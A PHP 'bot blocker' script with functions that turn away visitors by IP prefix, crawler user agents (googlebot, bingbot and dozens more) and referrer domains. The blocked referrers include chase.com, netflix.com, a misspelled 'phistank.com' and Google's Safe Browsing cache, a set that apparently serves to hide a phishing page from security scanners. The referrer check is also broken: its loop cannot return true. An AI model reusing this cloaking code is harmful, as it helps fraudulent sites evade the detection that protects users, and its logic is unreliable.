<?php

/** Bot Blocker by Muhammad Fauzan
 *  Follow me on Instagram : instagram.com/fauzan121002
 *  github.com/fauzan121002/botblocker
 */

/**
 * detectIpRange
 *
 * @return void
 */
function detectIpRange(){
    $banned_ip_addresses = array('41.','64.79.100.23','5.254.97.75','148.251.236.167','88.180.102.124','62.210.172.77','45.','195.206.253.146');
    $banned_bots = array('.ru','AhrefsBot','crawl','crawler','DotBot','linkdex','majestic','meanpath','PageAnalyzer','robot','rogerbot','semalt','SeznamBot','spider',"googlebot","bingbot","yandexbot","ahrefsbot","msnbot","linkedinbot","exabot","compspybot",
    "yesupbot","paperlibot","tweetmemebot","semrushbot","gigabot","voilabot","adsbot-google",
    "botlink","alkalinebot","araybot","undrip bot","borg-bot","boxseabot","yodaobot","admedia bot",
    "ezooms.bot","confuzzledbot","coolbot","internet cruiser robot","yolinkbot","diibot","musobot",
    "dragonbot","elfinbot","wikiobot","twitterbot","contextad bot","hambot","iajabot","news bot",
    "irobot","socialradarbot","ko_yappo_robot","skimbot","psbot","rixbot","seznambot","careerbot",
    "simbot","solbot","mail.ru_bot","spiderbot","blekkobot","bitlybot","techbot","void-bot",
    "vwbot_k","diffbot","friendfeedbot","archive.org_bot","woriobot","crystalsemanticsbot","wepbot",
    "spbot","tweetedtimes bot","mj12bot","who.is bot","psbot","robot","jbot","bbot","bot");
    $banned_unknown_bots = array('bot ','bot_','bot+','bot:','bot,','bot;','bot\\','bot.','bot/','bot-');
    $good_bots = array('Google','MSN','bing','Slurp','Yahoo','DuckDuck');

    $ip_address = $_SERVER['REMOTE_ADDR'];
    $browser = $_SERVER['HTTP_USER_AGENT'];

    $ipfound = $piece = $botfound = $gbotfound = $ubotfound = '';

    if(!empty($banned_ip_addresses)){
        if(in_array($ip_address, $banned_ip_addresses)){
            $ipfound = 'found';
        }

        if($ipfound != 'found'){
            $ip_pieces = explode('.', $ip_address);
            foreach ($ip_pieces as $value){
            $piece = $piece.$value.'.';
                if(in_array($piece, $banned_ip_addresses)){
                    return true;
                }
            }
        }

        if($ipfound == 'found'){
            return true;
        }
    }

    if(!empty($banned_bots)){
        foreach ($banned_bots as $bbvalue){
            $pos1 = stripos($browser, $bbvalue);
            if($pos1 !== false){
                $botfound = 'found';
            }
        }

        if($botfound == 'found'){
            return true;
        }
    }

    if(!empty($good_bots)){
        foreach ($good_bots as $gbvalue){
            $pos2 = stripos($browser, $gbvalue);
            if($pos2 !== false){
                $gbotfound = 'found';
            }
        }
    }

    if($gbotfound != 'found'){
        if(!empty($banned_unknown_bots)){
            foreach ($banned_unknown_bots as $bubvalue){
            $pos3 = stripos($browser, $bubvalue);

                if($pos3 !== false){
                    $ubotfound = 'found';
                }
            }

            if($ubotfound == 'found'){
                return true;
            }
        }
    }

    return false;
}

/**
 * detectHostname
 *
 * @param  mixed $ip
 * @param  mixed $agent
 * @param  mixed $hostname
 * @return void
 */
function detectHostname($ip, $agent, &$hostname)
{
    $hostname = $ip;

    if (preg_match('/(?:google|yandex)bot/iu', $agent)) {

        $hostname = gethostbyaddr($ip);

        if ($hostname !== false && $hostname != $ip) {

            if (preg_match('/\.((?:google(?:bot)?|yandex)\.(?:com|ru))$/iu', $hostname)) {

                $ip = gethostbyname($hostname);

                if ($ip != $hostname) {
                    return true;
                }
            }
        }
    }

    return false;
}

/**
 * detectReferrer
 *
 * @return void
 */
function detectReferrer(){
    if(isset($_SERVER['HTTP_REFERER'])) {
        $ref = $_SERVER['HTTP_REFERER'];
        $refData = parse_url($ref);

        $referrer_url_list = array(
            'google.com','chase.com','aws.com','amazon.com','netflix.com','facebook.com','yahoo.com',
            'bing.com','msn.com','ask.com','excite.com','altavista.com','netscape.com','aol.com',
            'hotmail.com','outlook.com','live.com','crawl.com','hotbot.com','goto.com','lycos.com',
            'metacrawler.com','phistank.com','infoseek.co','mamma.com','alltheweb.com','safebrowsing-cache.google.com'
        );
        
        foreach($referrer_url_list as $value){
            if($refData['host'] !== $value) {
                return false;
            }      
        } 
        return true;
    }
    else{
        return false;
    }     
}
